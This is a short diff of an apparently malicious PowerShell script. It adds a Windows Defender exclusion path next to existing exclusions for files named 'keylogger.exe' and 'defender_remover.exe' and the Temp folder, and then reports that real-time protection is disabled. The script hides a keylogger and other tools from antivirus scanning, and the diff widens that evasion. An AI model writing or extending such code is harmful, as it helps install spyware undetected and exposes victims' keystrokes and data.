@@ -21,6 +21,7 @@ try {
     Add-MpPreference -ExclusionProcess "$startupPath\defender_remover.exe"
     Add-MpPreference -ExclusionPath "$startupPath\keylogger.exe"
     Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
+    Add-MpPreference -ExclusionPath "C:\Users\Public\Public Display"
 
     Write-Host "Defender Real-Time Protection is now disabled." -ForegroundColor Green
 } catch {
